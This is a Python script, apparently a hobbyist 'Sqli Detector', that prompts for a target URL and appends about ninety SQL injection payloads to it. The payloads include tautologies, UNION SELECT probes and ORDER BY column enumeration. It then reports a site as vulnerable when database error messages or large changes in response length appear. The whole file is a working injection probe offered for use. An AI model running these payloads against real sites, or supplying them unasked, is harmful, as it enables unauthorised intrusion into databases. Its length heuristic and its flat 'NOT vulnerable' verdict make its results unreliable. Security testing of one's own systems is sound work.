from colorama import init, Fore
import requests
from requests.exceptions import RequestException
import sys
import time

# Initialize colorama for colored terminal output
init(autoreset=True)

# Banner
print(Fore.GREEN + r'''
   _____       _ _   _____       _            _             
  / ____|     | (_) |  __ \     | |          | |            
 | (___   __ _| |_  | |  | | ___| |_ ___  ___| |_ ___  _ __ 
  \___ \ / _` | | | | |  | |/ _ \ __/ _ \/ __| __/ _ \| '__|
  ____) | (_| | | | | |__| |  __/ ||  __/ (__| || (_) | |   
 |_____/ \__, |_|_| |_____/ \___|\__\___|\___|\__\___/|_|   
           | |                                             
           |_|                                             
    Sqli Detector with Expanded Payloads - Coded by Aung San Oo
    Github Page : https://aungsanoo.com
''')

# Function to detect SQL errors in HTTP response
def is_vulnerable(response):
    """
    Determines whether a page is SQL Injection vulnerable by checking
    for common database error messages in the HTTP response.
    """
    errors = {
        "mysql": [
            "you have an error in your sql syntax;",
            "warning: mysql"
        ],
        "sql_server": [
            "unclosed quotation mark after the character string",
            "incorrect syntax near"
        ],
        "oracle": [
            "quoted string not properly terminated",
            "ora-00933: sql command not properly ended",
            "ora-00936: missing expression"
        ],
        "postgresql": [
            "pg_query",
            "syntax error at or near"
        ]
    }
    content = response.content.decode(errors="ignore").lower()

    for db_type, error_list in errors.items():
        for error in error_list:
            if error in content:
                print(Fore.GREEN + f"[!] Potential SQL Injection vulnerability detected: {error} ({db_type})")
                return True
    return False

# Function to scan a URL for SQL injection vulnerabilities
def scan(url):
    """Scan the URL for SQL injection vulnerabilities."""
    payloads = [
        "'", "''", "' OR 1=1; --", "' OR '1'='1", "' or", "-- or", "' OR '1",
        "' OR 1 - - -", " OR \"\"= ", " OR 1 = 1 - - -", "' OR '' = '",
        "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
        "' UNION SELECT NULL,NULL,NULL--", "1' ORDER BY 1, 2--+",
        "1' ORDER BY 1, 2, 3--+", "' AND 1=2 UNION SELECT 1,2,3 --",
        "1' GROUP BY 1, 2, --+", "1' GROUP BY 1, 2, 3--+",
        "' GROUP BY columnnames having 1= 1 - -", "-1' UNION SELECT 1, 2, 3--+",
        "OR 1 = 1", "OR 1 = 0", "OR 1= 1#", "OR 1 = 0#",
        "OR 1 = 1--", "OR 1= 0--", "HAVING 1 = 1", "HAVING 1= 0",
        "HAVING 1= 1#", "HAVING 1= 0#", "HAVING 1 = 1--", "HAVING 1 = 0--",
        "AND 1= 1", "AND 1= 0", "AND 1 = 1--", "AND 1 = 0--",
        "AND 1= 1#", "AND 1= 0#", "AND 1 = 1 AND '%' ='", "AND 1 = 0 AND '%' ='",
        "WHERE 1= 1 AND 1 = 1", "WHERE 1 = 1 AND 1 = 0",
        "WHERE 1 = 1 AND 1 = 1#", "WHERE 1 = 1 AND 1 = 0#",
        "WHERE 1 = 1 AND 1 = 1--", "WHERE 1 = 1 AND 1 = 0--",
        "ORDER BY 1--", "ORDER BY 2--", "ORDER BY 3--",
        "ORDER BY 4--", "ORDER BY 5--", "ORDER BY 6--",
        "ORDER BY 7--", "ORDER BY 8--", "ORDER BY 9--",
        "ORDER BY 10--", "ORDER BY 11--", "ORDER BY 12--",
        "ORDER BY 13--", "ORDER BY 14--", "ORDER BY 15--",
        "ORDER BY 16--", "ORDER BY 17--", "ORDER BY 18--",
        "ORDER BY 19--", "ORDER BY 20--", "ORDER BY 21--",
        "ORDER BY 22--", "ORDER BY 23--", "ORDER BY 24--",
        "ORDER BY 25--", "ORDER BY 26--", "ORDER BY 27--",
        "ORDER BY 28--", "ORDER BY 29--", "ORDER BY 30--",
        "ORDER BY 31337--"
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    print(Fore.YELLOW + f"[*] Starting SQL Injection scan for: {url}")
    vulnerable = False  # Flag to track if vulnerabilities are found

    try:
        # Fetch baseline response
        baseline_response = requests.get(url, headers=headers, timeout=5)
        baseline_length = len(baseline_response.content)

        for payload in payloads:
            full_url = f"{url}{payload}"
            try:
                response = requests.get(full_url, headers=headers, timeout=5)
                content_length = len(response.content)

                # Check for SQL errors
                if is_vulnerable(response):
                    print(Fore.GREEN + f"[+] SQL Injection Found with payload: {payload}")
                    vulnerable = True  # Mark as vulnerable
                # Compare response length to detect significant changes
                elif abs(content_length - baseline_length) > 50:
                    print(Fore.YELLOW + f"[!] Response length changed significantly with payload: {payload}")
                    vulnerable = True  # Mark as vulnerable
                else:
                    print(Fore.RED + f"[-] No vulnerability with payload: {payload}")
            except RequestException as e:
                print(Fore.RED + f"[!] Error with payload '{payload}': {e}")
    except RequestException as e:
        print(Fore.RED + f"[!] Could not fetch baseline response: {e}")

    print(Fore.BLUE + "[!] SQL Injection scan complete.")

    # Summary of results
    if vulnerable:
        print(Fore.GREEN + "[!!!] The target might be VULNERABLE to SQL Injection.")
    else:
        print(Fore.RED + "[+] The target is NOT vulnerable to SQL Injection.")

# Main program
if __name__ == "__main__":
    try:
        url = input(Fore.CYAN + "[*] Enter the target URL (e.g., http://example.com/page.php?id=): ")
        if not url.startswith("http://") and not url.startswith("https://"):
            print(Fore.RED + "[!] Invalid URL. Ensure it starts with http:// or https://")
        else:
            scan(url)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[-] Script interrupted by user.")
    except Exception as e:
        print(Fore.RED + f"[!] An unexpected error occurred: {e}")
    finally:
        input(Fore.CYAN + "\nPress Enter to Exit.")
